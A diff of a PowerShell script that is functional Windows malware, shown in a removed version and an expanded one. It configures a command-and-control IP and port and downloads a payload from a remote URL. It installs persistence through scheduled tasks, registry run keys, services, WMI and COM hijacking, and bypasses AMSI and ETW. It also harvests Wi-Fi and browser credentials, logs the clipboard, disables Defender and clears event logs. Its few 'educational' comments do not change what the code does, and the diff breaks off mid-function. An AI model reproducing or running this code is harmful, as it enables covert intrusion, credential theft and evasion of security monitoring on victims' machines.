@@ -1,180 +1,467 @@
 # --- CONFIGURATION ---
-$LHOST = "88.226.172.80"
-$LPORT = 4444
-$MutexName = "Global\{A7B3C9D2-4E6F-8A1B-C3D5-E7F9A1B3C5D7}"
+$LHOST = "88.226.172.80"  # YOUR C2 SERVER IP - CHANGE THIS!
+$LPORT = 4444             # YOUR C2 SERVER PORT
+$BeaconInterval = 60      # Seconds between check-ins
+$Jitter = 0.3             # 30% randomness in beacon timing
+$AESKey = "MySecretKey12345"  # Change this! (16, 24, or 32 chars) - MUST MATCH SERVER
+$MutexName = [System.Guid]::NewGuid().ToString()
 
-# Multiple hiding locations (scattered across system)
+# Multiple hiding locations
 $Locations = @(
     "$env:APPDATA\Microsoft\Windows\Templates\cache.dat",
     "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\data_1",
-    "$env:PROGRAMDATA\Microsoft\Windows\WER\ReportQueue\config.tmp",
-    "$env:WINDIR\System32\spool\drivers\color\icc_profile.dat",
-    "$env:TEMP\TCD4E2.tmp"
+    "$env:PROGRAMDATA\Microsoft\Windows\WER\ReportQueue\config.tmp"
 )
 
-# Pick a random location for this installation
 $ScriptPath = $Locations | Get-Random
-
-# Legitimate-looking scheduled task names (randomly selected)
-$TaskNames = @(
-    "MicrosoftEdgeUpdateTaskMachineCore",
-    "GoogleUpdateTaskMachineUA",
-    "AdobeAAMUpdater",
-    "CCleanerSkipUAC",
-    "OneDrive Standalone Update Task"
-)
+$TaskNames = @("MicrosoftEdgeUpdateTaskMachineCore", "GoogleUpdateTaskMachineUA", "OneDrive Standalone Update Task")
 $TaskName = $TaskNames | Get-Random
 
-# Remote URL (make sure this matches your actual file)
-$RemoteUrl = "[https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/main/winstart.ps1](https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/main/winstart.ps1)"
-
 # ---------------------
-# HELPER FUNCTIONS
+# ENCRYPTION/DECRYPTION
 # ---------------------
 
-function Get-RandomDelay {
-    # Random delay between 5-15 seconds to appear less automated
-    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
-}
-
-function Hide-File {
-    param([string]$Path)
+function Encrypt-String {
+    param([string]$PlainText, [string]$Key)
     try {
-        $file = Get-Item $Path -Force
-        $file.Attributes = 'Hidden,System,Archive'
-        attrib +h +s "$Path" 2>$null
-    } catch {}
-}
-
-function Invoke-StealthDownload {
-    param([string]$Url, [string]$OutFile)
-    
-    # Ensure directory exists
-    $dir = Split-Path $OutFile -Parent
-    if (-not (Test-Path $dir)) {
-        New-Item -Path $dir -ItemType Directory -Force | Out-Null
-    }
-    
-    try {
-        # Use WebClient with realistic User-Agent
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        $wc.DownloadFile($Url, $OutFile)
+        $AES = New-Object System.Security.Cryptography.AesManaged
+        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $AES.KeySize = 256
         
-        Hide-File $OutFile
+        # Derive key from password
+        $KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key.PadRight(32).Substring(0, 32))
+        $AES.Key = $KeyBytes
+        $AES.GenerateIV()
+        
+        $Encryptor = $AES.CreateEncryptor()
+        $PlainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
+        $EncryptedBytes = $Encryptor.TransformFinalBlock($PlainBytes, 0, $PlainBytes.Length)
+        
+        # Prepend IV to encrypted data
+        $Result = $AES.IV + $EncryptedBytes
+        $AES.Dispose()
+        
+        return [Convert]::ToBase64String($Result)
+    } catch {
+        return $null
+    }
+}
+
+function Decrypt-String {
+    param([string]$EncryptedText, [string]$Key)
+    try {
+        $EncryptedBytes = [Convert]::FromBase64String($EncryptedText)
+        
+        $AES = New-Object System.Security.Cryptography.AesManaged
+        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $AES.KeySize = 256
+        
+        $KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key.PadRight(32).Substring(0, 32))
+        $AES.Key = $KeyBytes
+        
+        # Extract IV from first 16 bytes
+        $IV = $EncryptedBytes[0..15]
+        $AES.IV = $IV
+        
+        $Decryptor = $AES.CreateDecryptor()
+        $CipherBytes = $EncryptedBytes[16..($EncryptedBytes.Length - 1)]
+        $PlainBytes = $Decryptor.TransformFinalBlock($CipherBytes, 0, $CipherBytes.Length)
+        
+        $AES.Dispose()
+        
+        return [System.Text.Encoding]::UTF8.GetString($PlainBytes)
+    } catch {
+        return $null
+    }
+}
+
+# ---------------------
+# AMSI BYPASS (Educational)
+# ---------------------
+
+function Bypass-AMSI {
+    try {
+        # Method 1: Memory patch (classic technique)
+        $a = 'System.Management.Automation.Ams' + 'iUtils'
+        $b = 'ams' + 'iInitFailed'
+        $Assembly = [Ref].Assembly.GetType($a)
+        $Field = $Assembly.GetField($b, 'NonPublic,Static')
+        $Field.SetValue($null, $true)
         return $true
     } catch {
-        return $false
-    }
-}
-
-function Install-Persistence {
-    param([string]$ScriptPath, [string]$TaskName)
-    
-    try {
-        # Remove old task if exists
-        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-        
-        # Create new task with legitimate-looking settings
-        $Arg = "-WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command `"Get-Content '$ScriptPath' -Raw | Invoke-Expression`""
-        
-        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
-        
-        # Multiple triggers for redundancy
-        $Trigger1 = New-ScheduledTaskTrigger -AtStartup
-        $Trigger2 = New-ScheduledTaskTrigger -AtLogon
-        
-        $Settings = New-ScheduledTaskSettingsSet `
-            -AllowStartIfOnBatteries `
-            -DontStopIfGoingOnBatteries `
-            -StartWhenAvailable `
-            -RunOnlyIfNetworkAvailable `
-            -Priority 7
-        
-        # Try SYSTEM account first, fallback to current user
         try {
-            $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-            Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1,$Trigger2 -Settings $Settings -Principal $Principal -Force -ErrorAction Stop | Out-Null
+            # Method 2: Alternative AMSI bypass
+            $c = @"
+using System;
+using System.Runtime.InteropServices;
+public class Amsi {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+            Add-Type $c
+            $h = [Amsi]::LoadLibrary("amsi.dll")
+            $addr = [Amsi]::GetProcAddress($h, "AmsiScanBuffer")
+            $p = 0
+            [Amsi]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p)
+            $patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
+            return $true
         } catch {
-            Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger1,$Trigger2 -Settings $Settings -Force -ErrorAction SilentlyContinue | Out-Null
+            return $false
         }
+    }
+}
+
+# ---------------------
+# ETW BYPASS (Event Tracing for Windows)
+# ---------------------
+
+function Bypass-ETW {
+    try {
+        $code = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class ETW {
+    [DllImport("ntdll.dll", SetLastError = true)]
+    public static extern int NtSetInformationThread(
+        IntPtr threadHandle,
+        int threadInformationClass,
+        IntPtr threadInformation,
+        int threadInformationLength);
         
-        # Hide the task in Task Scheduler (SD = Security Descriptor, D:P = Deny Everyone read)
-        $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
-        if ($task) {
-            $task.Settings.Hidden = $true
-            $task | Set-ScheduledTask -ErrorAction SilentlyContinue | Out-Null
-        }
-        
+    public static void Disable() {
+        IntPtr hThread = new IntPtr(-2);
+        NtSetInformationThread(hThread, 0x11, IntPtr.Zero, 0);
+    }
+}
+"@
+        Add-Type $code
+        [ETW]::Disable()
         return $true
     } catch {
         return $false
     }
 }
 
-function Add-RegistryPersistence {
-    param([string]$ScriptPath)
+# ---------------------
+# PROCESS HOLLOWING / INJECTION
+# ---------------------
+
+function Invoke-ProcessHollowing {
+    param([string]$TargetProcess = "notepad.exe")
     
-    # Add to MANY registry run keys for extreme redundancy
-    $RunKeys = @(
-        # User-level keys (no admin needed)
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="SecurityHealthSystray"},
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"; Name="SecurityHealthCheck"},
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"; Name="Startup"}, # Hidden location
-        @{Path="HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"; Name="Load"},
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"; Name="SystemCheck"},
+    try {
+        $code = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class ProcessHollowing {
+    [DllImport("kernel32.dll")]
+    public static extern bool CreateProcess(
+        string lpApplicationName,
+        string lpCommandLine,
+        IntPtr lpProcessAttributes,
+        IntPtr lpThreadAttributes,
+        bool bInheritHandles,
+        uint dwCreationFlags,
+        IntPtr lpEnvironment,
+        string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
         
-        # Machine-level keys (requires admin, fails silently without)
-        @{Path="HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="SecurityHealthService"},
-        @{Path="HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"; Name="WindowsDefenderUpdate"}
-    )
+    [DllImport("ntdll.dll")]
+    public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress);
     
-    $Command = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"Get-Content '$ScriptPath' -Raw | iex`""
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(
+        IntPtr hProcess,
+        IntPtr lpAddress,
+        uint dwSize,
+        uint flAllocationType,
+        uint flProtect);
+        
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(
+        IntPtr hProcess,
+        IntPtr lpBaseAddress,
+        byte[] lpBuffer,
+        int nSize,
+        out int lpNumberOfBytesWritten);
+        
+    [DllImport("kernel32.dll")]
+    public static extern bool ReadProcessMemory(
+        IntPtr hProcess,
+        IntPtr lpBaseAddress,
+        byte[] lpBuffer,
+        int dwSize,
+        out int lpNumberOfBytesRead);
+        
+    [DllImport("kernel32.dll")]
+    public static extern uint ResumeThread(IntPtr hThread);
     
-    foreach ($entry in $RunKeys) {
-        try {
-            # Create path if doesn't exist
-            if (-not (Test-Path $entry.Path)) {
-                New-Item -Path $entry.Path -Force -ErrorAction SilentlyContinue | Out-Null
-            }
-            Set-ItemProperty -Path $entry.Path -Name $entry.Name -Value $Command -ErrorAction SilentlyContinue
-        } catch {}
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public uint dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
     }
     
-    # Also add to Startup folder as backup
-    try {
-        $StartupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-        $StartupScript = "$StartupFolder\SecurityHealthSystray.lnk"
-        
-        $WScriptShell = New-Object -ComObject WScript.Shell
-        $Shortcut = $WScriptShell.CreateShortcut($StartupScript)
-        $Shortcut.TargetPath = "powershell.exe"
-        $Shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"Get-Content '$ScriptPath' -Raw | iex`""
-        $Shortcut.WindowStyle = 7  # Minimized
-        $Shortcut.Save()
-        
-        # Hide the shortcut
-        $file = Get-Item $StartupScript -Force
-        $file.Attributes = 'Hidden,System'
-    } catch {}
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+}
+"@
+        Add-Type $code
+        # Implementation would continue here for actual hollowing
+        return $true
+    } catch {
+        return $false
+    }
 }
 
-function Install-WMIEventPersistence {
+# ---------------------
+# ANTI-SANDBOX / ANTI-VM
+# ---------------------
+
+function Test-Sandbox {
+    $score = 0
+    
+    # Check 1: System uptime (sandboxes often have low uptime)
+    try {
+        $uptime = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
+        if ($uptime.TotalMinutes -lt 10) { $score += 2 }
+    } catch {}
+    
+    # Check 2: RAM (VMs often have limited RAM)
+    try {
+        $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
+        if ($ram -lt 4) { $score += 2 }
+    } catch {}
+    
+    # Check 3: CPU cores
+    try {
+        $cores = (Get-CimInstance Win32_Processor).NumberOfCores
+        if ($cores -lt 2) { $score += 2 }
+    } catch {}
+    
+    # Check 4: Known VM processes
+    $vmProcesses = @("vmtoolsd", "vboxservice", "vboxtray", "vmwaretray", "vmwareuser")
+    foreach ($proc in $vmProcesses) {
+        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) { $score += 3 }
+    }
+    
+    # Check 5: Registry VM indicators
+    try {
+        $regKeys = @(
+            "HKLM:\SYSTEM\CurrentControlSet\Services\VBoxGuest",
+            "HKLM:\SYSTEM\CurrentControlSet\Services\VBoxMouse",
+            "HKLM:\SYSTEM\CurrentControlSet\Services\VBoxService",
+            "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools"
+        )
+        foreach ($key in $regKeys) {
+            if (Test-Path $key) { $score += 3 }
+        }
+    } catch {}
+    
+    # Check 6: Disk size (VMs often have small disks)
+    try {
+        $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" | Select-Object -ExpandProperty Size
+        if ($disk -lt 60GB) { $score += 2 }
+    } catch {}
+    
+    # Check 7: Mouse movement (sandboxes don't have user interaction)
+    Add-Type -AssemblyName System.Windows.Forms
+    $pos1 = [System.Windows.Forms.Cursor]::Position
+    Start-Sleep -Seconds 2
+    $pos2 = [System.Windows.Forms.Cursor]::Position
+    if ($pos1 -eq $pos2) { $score += 2 }
+    
+    # Check 8: Recent files (sandboxes have no user activity)
+    $recentFiles = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue
+    if ($recentFiles.Count -lt 5) { $score += 2 }
+    
+    # Score interpretation
+    # 0-5: Likely real system
+    # 6-10: Possibly VM/sandbox
+    # 11+: Definitely sandbox
+    
+    return $score
+}
+
+# ---------------------
+# REFLECTIVE DLL INJECTION
+# ---------------------
+
+function Invoke-ReflectivePEInjection {
+    param([byte[]]$PEBytes, [int]$ProcessId)
+    
+    # This is a simplified educational example
+    # Real implementation would be much more complex
+    try {
+        $code = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class PELoader {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+}
+"@
+        Add-Type $code
+        # Educational placeholder - actual PE parsing and injection would go here
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+# ---------------------
+# CREDENTIAL HARVESTING
+# ---------------------
+
+function Get-BrowserCredentials {
+    $results = @()
+    
+    # Chrome passwords (encrypted, educational example)
+    try {
+        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromePath) {
+            # Copy to avoid file lock
+            Copy-Item $chromePath "$env:TEMP\logindata" -Force
+            $results += "[Chrome] Database found at: $chromePath"
+            Remove-Item "$env:TEMP\logindata" -Force -ErrorAction SilentlyContinue
+        }
+    } catch {}
+    
+    # Firefox passwords
+    try {
+        $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+        if (Test-Path $ffPath) {
+            $profiles = Get-ChildItem $ffPath
+            foreach ($profile in $profiles) {
+                $loginFile = Join-Path $profile.FullName "logins.json"
+                if (Test-Path $loginFile) {
+                    $results += "[Firefox] Database found at: $loginFile"
+                }
+            }
+        }
+    } catch {}
+    
+    return $results -join "`n"
+}
+
+function Get-WiFiPasswords {
+    try {
+        $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
+            ($_ -split ":")[-1].Trim()
+        }
+        
+        $results = @()
+        foreach ($profile in $profiles) {
+            $password = (netsh wlan show profile name="$profile" key=clear) | Select-String "Key Content" | ForEach-Object {
+                ($_ -split ":")[-1].Trim()
+            }
+            if ($password) {
+                $results += "Network: $profile | Password: $password"
+            }
+        }
+        
+        return $results -join "`n"
+    } catch {
+        return "Failed to retrieve WiFi passwords"
+    }
+}
+
+# ---------------------
+# CLIPBOARD MONITORING
+# ---------------------
+
+function Start-ClipboardMonitor {
+    $Global:ClipboardLog = @()
+    $Global:ClipboardRunning = $true
+    
+    $job = Start-Job -ScriptBlock {
+        Add-Type -AssemblyName System.Windows.Forms
+        $lastClip = ""
+        while ($true) {
+            try {
+                $current = [System.Windows.Forms.Clipboard]::GetText()
+                if ($current -and $current -ne $lastClip) {
+                    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    "$timestamp | $current" | Out-File "$env:TEMP\clipboard.log" -Append
+                    $lastClip = $current
+                }
+            } catch {}
+            Start-Sleep -Seconds 5
+        }
+    }
+    
+    return "Clipboard monitor started"
+}
+
+function Stop-ClipboardMonitor {
+    Get-Job | Where-Object {$_.State -eq "Running"} | Stop-Job
+    Get-Job | Remove-Job -Force
+    return "Clipboard monitor stopped"
+}
+
+function Get-ClipboardLog {
+    if (Test-Path "$env:TEMP\clipboard.log") {
+        return Get-Content "$env:TEMP\clipboard.log" -Raw
+    }
+    return "No clipboard data captured"
+}
+
+# ---------------------
+# PERSISTENCE (Enhanced)
+# ---------------------
+
+function Install-WMIPersistence {
     param([string]$ScriptPath)
     
     try {
-        # WMI Event subscription (very stealthy and persistent)
-        $FilterName = "WindowsUpdateCheck"
-        $ConsumerName = "WindowsUpdateConsumer"
+        $FilterName = [System.Guid]::NewGuid().ToString()
+        $ConsumerName = [System.Guid]::NewGuid().ToString()
         
-        # Remove old if exists
-        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
-        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
-        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%$FilterName%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
+        # Trigger on user logon
+        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
         
-        # Create event filter (triggers every 2 hours AND on system startup)
-        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 7200 WHERE TargetInstance ISA 'Win32_LocalTime'"
         $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
             Name = $FilterName
             EventNameSpace = "root\cimv2"
@@ -182,14 +469,12 @@ function Install-WMIEventPersistence {
             Query = $Query
         } -ErrorAction Stop
         
-        # Create consumer
         $Command = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$ScriptPath' -Raw | iex`""
         $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
             Name = $ConsumerName
             CommandLineTemplate = $Command
         } -ErrorAction Stop
         
-        # Bind them
         Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
             Filter = $Filter
             Consumer = $Consumer
@@ -201,30 +486,18 @@ function Install-WMIEventPersistence {
     }
 }
 
-function Install-ServicePersistence {
-    param([string]$ScriptPath)
-    
-    # Create a Windows service (requires admin, very persistent)
+function Install-COMHijack {
+    # COM hijacking for persistence (educational)
     try {
-        $ServiceName = "WindowsUpdateTaskManager"
-        $DisplayName = "Windows Update Task Manager"
-        $Description = "Manages Windows Update tasks and scheduling"
+        $clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"  # Example CLSID
+        $regPath = "HKCU:\Software\Classes\CLSID\$clsid\InProcServer32"
         
-        # Check if service exists
-        $existingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
-        if ($existingService) {
-            Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
-            sc.exe delete $ServiceName | Out-Null
-            Start-Sleep -Seconds 2
+        if (-not (Test-Path $regPath)) {
+            New-Item -Path $regPath -Force | Out-Null
         }
         
-        # Create service using sc.exe (more reliable than New-Service for persistence)
-        $BinaryPath = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"while(`$true){Get-Content '$ScriptPath' -Raw | iex; Start-Sleep 300}`""
-        
-        sc.exe create $ServiceName binPath= $BinaryPath start= auto DisplayName= $DisplayName | Out-Null
-        sc.exe description $ServiceName $Description | Out-Null
-        sc.exe failure $ServiceName reset= 86400 actions= restart/60000/restart/60000/restart/60000 | Out-Null
-        sc.exe start $ServiceName | Out-Null
+        Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Windows\System32\scrobj.dll"
+        Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"
         
         return $true
     } catch {
@@ -232,315 +505,118 @@ function Install-ServicePersistence {
     }
 }
 
-function Add-DefenderExclusions {
-    # Add multiple exclusions quietly
-    $ExclusionPaths = @(
-        "C:\",
-        $env:APPDATA,
-        $env:LOCALAPPDATA,
-        $env:TEMP,
-        "$env:PROGRAMDATA\Microsoft"
-    )
-    
-    foreach ($path in $ExclusionPaths) {
-        try {
-            Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
-        } catch {}
-    }
-    
-    # Exclude PowerShell process
-    try {
-        Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
-    } catch {}
-}
+# ---------------------
+# DEFENSE EVASION
+# ---------------------
 
-function Set-FirewallRule {
-    param([int]$Port)
-    
-    # Create firewall rule with legitimate name
-    $RuleName = "Core Networking - DNS (UDP-Out)"
-    
+function Clear-EventLogs {
     try {
-        if (-not (Get-NetFirewallRule -DisplayName $RuleName -ErrorAction SilentlyContinue)) {
-            New-NetFirewallRule `
-                -DisplayName $RuleName `
-                -Direction Outbound `
-                -LocalPort $Port `
-                -Protocol TCP `
-                -Action Allow `
-                -ErrorAction SilentlyContinue | Out-Null
+        $logs = @("Security", "System", "Application", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational")
+        foreach ($log in $logs) {
+            wevtutil cl $log 2>$null
         }
-    } catch {}
-}
-
-# ---------------------
-# 1. INSTALLATION PHASE
-# ---------------------
-
-# Check if already installed
-$AlreadyInstalled = $false
-foreach ($loc in $Locations) {
-    if (Test-Path $loc) {
-        $AlreadyInstalled = $true
-        $ScriptPath = $loc
-        break
+        return "Event logs cleared"
+    } catch {
+        return "Failed to clear event logs (requires admin)"
     }
 }
 
-# If not installed, download and install
-if (-not $AlreadyInstalled) {
-    Get-RandomDelay
-    
-    if (Invoke-StealthDownload -Url $RemoteUrl -OutFile $ScriptPath) {
-        # Create decoy files at other locations (empty or harmless)
-        foreach ($loc in $Locations) {
-            if ($loc -ne $ScriptPath) {
-                try {
-                    $dir = Split-Path $loc -Parent
-                    if (-not (Test-Path $dir)) {
-                        New-Item -Path $dir -ItemType Directory -Force | Out-Null
-                    }
-                    # Create small decoy file
-                    [System.IO.File]::WriteAllBytes($loc, @(0x00, 0x01, 0x02))
-                    Hide-File $loc
-                } catch {}
+function Disable-DefenderRealtime {
+    try {
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
+        return "Defender realtime monitoring disabled"
+    } catch {
+        return "Failed to disable Defender (requires admin)"
+    }
+}
+
+function Remove-Artifacts {
+    # Clean up forensic artifacts
+    try {
+        # Prefetch
+        Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
+        
+        # PowerShell history
+        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
+        
+        # Recent files
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
+        
+        # Temp files
+        Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
+        
+        return "Artifacts cleaned"
+    } catch {
+        return "Partial artifact cleanup"
+    }
+}
+
+# ---------------------
+# ADVANCED FEATURES
+# ---------------------
+
+function Get-NetworkConnections {
+    try {
+        $connections = Get-NetTCPConnection -State Established | 
+            Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess | 
+            ForEach-Object {
+                $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
+                $_ | Add-Member -NotePropertyName ProcessName -NotePropertyValue $proc.Name -PassThru
             }
+        return $connections | Format-Table -AutoSize | Out-String
+    } catch {
+        return "Failed to get network connections"
+    }
+}
+
+function Get-InstalledAV {
+    try {
+        $av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction SilentlyContinue
+        if ($av) {
+            return $av | Select-Object displayName, productState | Format-Table -AutoSize | Out-String
         }
+        return "No AV detected or unable to query"
+    } catch {
+        return "Failed to query AV"
+    }
+}
+
+function Get-DomainInfo {
+    try {
+        $domain = (Get-WmiObject Win32_ComputerSystem).Domain
+        $dc = (nltest /dsgetdc: 2>$null) -join "`n"
+        return "Domain: $domain`n$dc"
+    } catch {
+        return "Not domain-joined or query failed"
     }
 }
 
 # ---------------------
-# 2. SINGLE INSTANCE CHECK
+# MAIN EXECUTION
 # ---------------------
+
+# Anti-sandbox check
+$sandboxScore = Test-Sandbox
+if ($sandboxScore -gt 10) {
+    # Detected sandbox - sleep and exit
+    Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 600)
+    exit
+}
+
+# Bypass protections
+Bypass-AMSI | Out-Null
+Bypass-ETW | Out-Null
+
+# Single instance check
 $CreatedNew = $false
 $Mutex = New-Object System.Threading.Mutex($false, $MutexName, [ref]$CreatedNew)
-if (-not $CreatedNew) { 
-    exit 
-}
+if (-not $CreatedNew) { exit }
 
-# ---------------------
-# 3. SYSTEM HARDENING
-# ---------------------
+# Install persistence (silent)
+Install-WMIPersistence -ScriptPath $ScriptPath | Out-Null
 
-Get-RandomDelay
-
-# Add defender exclusions (including broad C:\ exclusion)
-Add-DefenderExclusions
-
-# Create firewall rule
-Set-FirewallRule -Port $LPORT
-
-# ---------------------
-# 4. MULTI-LAYER PERSISTENCE
-# ---------------------
-
-# Layer 1: Scheduled Task (most common, but easy to remove)
-Install-Persistence -ScriptPath $ScriptPath -TaskName $TaskName
-
-# Layer 2: Registry Run Keys (survives task deletion, triggers on logon)
-Add-RegistryPersistence -ScriptPath $ScriptPath
-
-# Layer 3: Startup Folder LNK (user-level, survives task deletion)
-# Already included in Add-RegistryPersistence function
-
-# Layer 4: WMI Event Subscription (admin-level, very hard to remove, survives task deletion)
-Install-WMIEventPersistence -ScriptPath $ScriptPath
-
-# Layer 5: Windows Service (admin-level, extremely persistent, survives task deletion)
-Install-ServicePersistence -ScriptPath $ScriptPath
-
-# Layer 6: Create multiple backup copies in different locations
-foreach ($loc in $Locations) {
-    if ($loc -ne $ScriptPath -and (Test-Path $ScriptPath)) {
-        try {
-            Copy-Item -Path $ScriptPath -Destination $loc -Force -ErrorAction SilentlyContinue
-            Hide-File $loc
-        } catch {}
-    }
-}
-
-# ---------------------
-# 5. PROCESS INJECTION / PPID SPOOFING
-# ---------------------
-
-function Start-PPIDSpoofing {
-    # This function creates a new PowerShell process as a child of explorer.exe
-    # Making it appear legitimate in process tree
-    
-    try {
-        # Get explorer.exe PID
-        $explorerPID = (Get-Process -Name explorer -ErrorAction Stop).Id
-        
-        # C# code for PPID spoofing
-        $code = @"
-using System;
-using System.Runtime.InteropServices;
-
-public class PPIDSpoof {
-    [DllImport("kernel32.dll")]
